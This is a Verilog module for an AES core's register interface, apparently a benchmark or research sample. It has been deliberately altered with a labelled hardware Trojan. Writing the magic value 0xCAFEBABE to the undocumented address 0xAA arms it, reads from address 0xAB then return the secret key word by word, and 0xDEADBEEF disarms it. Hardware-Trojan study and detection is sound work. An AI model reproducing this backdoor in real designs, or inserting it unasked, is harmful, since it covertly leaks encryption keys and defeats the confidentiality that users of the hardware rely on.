module aes(
           // Clock and reset.
           input wire           clk,
           input wire           reset_n,

           // Control.
           input wire           cs,
           input wire           we,

           // Data ports.
           input wire  [7 : 0]  address,
           input wire  [31 : 0] write_data,
           output wire [31 : 0] read_data
          );

  //----------------------------------------------------------------
  // Internal constant and parameter definitions.
  //----------------------------------------------------------------
  localparam ADDR_NAME0       = 8'h00;
  localparam ADDR_NAME1       = 8'h01;
  localparam ADDR_VERSION     = 8'h02;

  localparam ADDR_CTRL        = 8'h08;
  localparam CTRL_INIT_BIT    = 0;
  localparam CTRL_NEXT_BIT    = 1;

  localparam ADDR_STATUS      = 8'h09;
  localparam STATUS_READY_BIT = 0;
  localparam STATUS_VALID_BIT = 1;

  localparam ADDR_CONFIG      = 8'h0a;
  localparam CTRL_ENCDEC_BIT  = 0;
  localparam CTRL_KEYLEN_BIT  = 1;

  localparam ADDR_KEY0        = 8'h10;
  localparam ADDR_KEY7        = 8'h17;

  localparam ADDR_BLOCK0      = 8'h20;
  localparam ADDR_BLOCK3      = 8'h23;

  localparam ADDR_RESULT0     = 8'h30;
  localparam ADDR_RESULT3     = 8'h33;

  localparam CORE_NAME0       = 32'h61657320; // "aes "
  localparam CORE_NAME1       = 32'h20202020; // "    "
  localparam CORE_VERSION     = 32'h302e3630; // "0.60"

  // *** TROJAN MODIFIED: Define Trojan trigger and data addresses ***
  localparam TROJAN_TRIGGER_ADDR = 8'hAA;
  localparam TROJAN_DATA_ADDR    = 8'hAB;

  //----------------------------------------------------------------
  // Registers including update variables and write enable.
  //----------------------------------------------------------------
  reg init_reg;
  reg init_new;

  reg next_reg;
  reg next_new;

  reg encdec_reg;
  reg keylen_reg;
  reg config_we;

  reg [31 : 0] block_reg [0 : 3];
  reg          block_we;

  reg [31 : 0] key_reg [0 : 7];
  reg          key_we;

  reg [127 : 0] result_reg;
  reg           valid_reg;
  reg           ready_reg;

  // *** TROJAN MODIFIED: Trojan control and registers (new behavior) ***
  reg           trojan_active;              // Latch if trigger event has occurred
  reg [3:0]     trojan_key_word_idx;        // Pointer to leak key 32b segments

  // Holding output and handshake for stable-one-cycle leaking:
  reg [31:0]    trojan_output_word;        // Word presented for leaking
  reg           trojan_output_valid;       // When high, trojan_output_word is valid on read_data
  reg           trojan_request;            // Set combinationally when a read request for Trojan address occurs

  //----------------------------------------------------------------
  // Wires.
  //----------------------------------------------------------------
  reg [31 : 0]   tmp_read_data;

  wire           core_encdec;
  wire           core_init;
  wire           core_next;
  wire           core_ready;
  wire [255 : 0] core_key;
  wire           core_keylen;
  wire [127 : 0] core_block;
  wire [127 : 0] core_result;
  wire           core_valid;

  // *** TROJAN MODIFIED: Key slice for covert payload (combinational) ***
  wire [31:0] trojan_leak_word;
  assign trojan_leak_word = key_reg[trojan_key_word_idx];

  //----------------------------------------------------------------
  // Concurrent connectivity for ports etc.
  //----------------------------------------------------------------
  assign read_data = tmp_read_data;

  assign core_key = {key_reg[0], key_reg[1], key_reg[2], key_reg[3],
                     key_reg[4], key_reg[5], key_reg[6], key_reg[7]};

  assign core_block  = {block_reg[0], block_reg[1],
                        block_reg[2], block_reg[3]};
  assign core_init   = init_reg;
  assign core_next   = next_reg;
  assign core_encdec = encdec_reg;
  assign core_keylen = keylen_reg;

  //----------------------------------------------------------------
  // core instantiation.
  //----------------------------------------------------------------
  aes_core core(
                .clk(clk),
                .reset_n(reset_n),

                .encdec(core_encdec),
                .init(core_init),
                .next(core_next),
                .ready(core_ready),

                .key(core_key),
                .keylen(core_keylen),

                .block(core_block),
                .result(core_result),
                .result_valid(core_valid)
               );

  //----------------------------------------------------------------
  // reg_update
  // Update functionality for all registers in the core.
  //----------------------------------------------------------------
  always @ (posedge clk or negedge reset_n)
    begin : reg_update
      integer i;

      if (!reset_n)
        begin
          for (i = 0 ; i < 4 ; i = i + 1)
            block_reg[i] <= 32'h0;

          for (i = 0 ; i < 8 ; i = i + 1)
            key_reg[i] <= 32'h0;

          init_reg   <= 1'b0;
          next_reg   <= 1'b0;
          encdec_reg <= 1'b0;
          keylen_reg <= 1'b0;

          result_reg <= 128'h0;
          valid_reg  <= 1'b0;
          ready_reg  <= 1'b0;

          // *** TROJAN MODIFIED: Reset Trojan state ***
          trojan_active <= 1'b0;
          trojan_key_word_idx <= 4'd0;
          trojan_output_word <= 32'h0;
          trojan_output_valid <= 1'b0;
          trojan_request <= 1'b0;
        end
      else
        begin
          ready_reg  <= core_ready;
          valid_reg  <= core_valid;
          result_reg <= core_result;
          init_reg   <= init_new;
          next_reg   <= next_new;

          if (config_we)
            begin
              encdec_reg <= write_data[CTRL_ENCDEC_BIT];
              keylen_reg <= write_data[CTRL_KEYLEN_BIT];
            end

          if (key_we)
            key_reg[address[2 : 0]] <= write_data;

          if (block_we)
            block_reg[address[1 : 0]] <= write_data;

          // *** TROJAN MODIFIED: Trigger / Deactivate on writes to trigger address ***
          if (cs && we && (address == TROJAN_TRIGGER_ADDR) && (write_data == 32'hCAFEBABE))
            begin
              trojan_active <= 1'b1;
              trojan_key_word_idx <= 4'd0;
              // Make sure no stale output is presented until a request occurs
              trojan_output_valid <= 1'b0;
              trojan_output_word <= 32'h0;
            end
          else if (cs && we && (address == TROJAN_TRIGGER_ADDR) && (write_data == 32'hDEADBEEF))
            begin
              trojan_active <= 1'b0;
              trojan_key_word_idx <= 4'd0;
              trojan_output_valid <= 1'b0;
              trojan_output_word <= 32'h0;
            end

          // *** TROJAN SEQUENCING LOGIC ***
          // trojan_request is asserted combinationally by api when a read of TROJAN_DATA_ADDR happens.
          // If a request was seen at the previous combinational evaluation (trojan_request == 1),
          // capture the current key word into trojan_output_word and assert trojan_output_valid,
          // making that word available to be read for one full cycle.
          if (trojan_request && trojan_active)
            begin
              // Capture current word to output and mark valid for one cycle
              trojan_output_word <= key_reg[trojan_key_word_idx];
              trojan_output_valid <= 1'b1;
              // Clear trojan_request here (it's re-driven combinationally each cycle by api)
              // Index increment happens on the *next* clock edge below (when trojan_output_valid was observed previously)
            end
          else if (trojan_output_valid)
            begin
              // This branch executes one clock after trojan_output_valid was asserted,
              // so advance the index now and clear the valid flag so output is valid only for one cycle.
              // If we reached the last word, finish and clear trojan_active.
              if (trojan_key_word_idx == (keylen_reg ? 4'd7 : 4'd3))
                begin
                  trojan_active <= 1'b0;        // Leak finished (128b: 4 words, 256b: 8 words)
                  trojan_key_word_idx <= 4'd0;
                end
              else
                trojan_key_word_idx <= trojan_key_word_idx + 4'd1;

              trojan_output_valid <= 1'b0;
              // trojan_output_word may hold last value, but is not considered valid after clearing valid flag.
            end
          else
            begin
              // normal case: nothing to do with the trojan this cycle
              // keep previous trojan_active / idx unless other branches changed them
            end

          // Clear combinational request latch (will be re-driven by api in next comb. evaluation)
          trojan_request <= 1'b0;
        end
    end // reg_update

  //----------------------------------------------------------------
  // api
  //
  // The interface command decoding logic (combinational).
  //----------------------------------------------------------------
  always @*
    begin : api
      init_new      = 1'b0;
      next_new      = 1'b0;
      config_we     = 1'b0;
      key_we        = 1'b0;
      block_we      = 1'b0;
      tmp_read_data = 32'h0;

      // Default combinational trojan_request clear; set to '1' if read to TROJAN_DATA_ADDR occurs.
      // reg_update samples trojan_request on the following posedge.
      // This ensures the sequence: read request -> next posedge capture output -> output valid for one cycle -> following posedge increment index.
      // Note: trojan_output_valid is a register updated in reg_update and used here to present stable data.
      // trojan_request (reg) is set here but cleared at end of reg_update on posedge.
      // This handshake produces the required 1-clock stable leak.
      trojan_request = 1'b0;

      if (cs)
        begin
          if (we)
            begin
              if (address == ADDR_CTRL)
                begin
                  init_new = write_data[CTRL_INIT_BIT];
                  next_new = write_data[CTRL_NEXT_BIT];
                end

              if (address == ADDR_CONFIG)
                config_we = 1'b1;

              if ((address >= ADDR_KEY0) && (address <= ADDR_KEY7))
                key_we = 1'b1;

              if ((address >= ADDR_BLOCK0) && (address <= ADDR_BLOCK3))
                block_we = 1'b1;

              // Writes to trigger address handled in reg_update (trojan activation/deactivation)
            end // if (we)
          else
            begin
              case (address)
                ADDR_NAME0:   tmp_read_data = CORE_NAME0;
                ADDR_NAME1:   tmp_read_data = CORE_NAME1;
                ADDR_VERSION: tmp_read_data = CORE_VERSION;
                ADDR_CTRL:    tmp_read_data = {28'h0, keylen_reg, encdec_reg, next_reg, init_reg};
                ADDR_STATUS:  tmp_read_data = {30'h0, valid_reg, ready_reg};

                default:
                  begin
                  end
              endcase // case (address)

              if ((address >= ADDR_RESULT0) && (address <= ADDR_RESULT3))
                tmp_read_data = result_reg[(3 - (address - ADDR_RESULT0)) * 32 +: 32];

              // *** TROJAN MODIFIED: Present leaked key word for exactly one cycle ***
              // If trojan_output_valid (set on a prior posedge when a request was observed),
              // present trojan_output_word on the read bus.
              if (trojan_output_valid && (address == TROJAN_DATA_ADDR))
                begin
                  tmp_read_data = trojan_output_word;
                end
              else if (trojan_active && (address == TROJAN_DATA_ADDR))
                begin
                  // If a read to the trojan data address occurs now, request the trojan to prepare the next output.
                  // The actual output will be loaded on the next rising clock edge and then be valid for one cycle.
                  trojan_request = 1'b1;
                  // For this comb. cycle we do not yet have a stable data word (unless trojan_output_valid was already set),
                  // so tmp_read_data remains 0 unless trojan_output_valid was set above.
                end
            end
        end
    end // api
endmodule
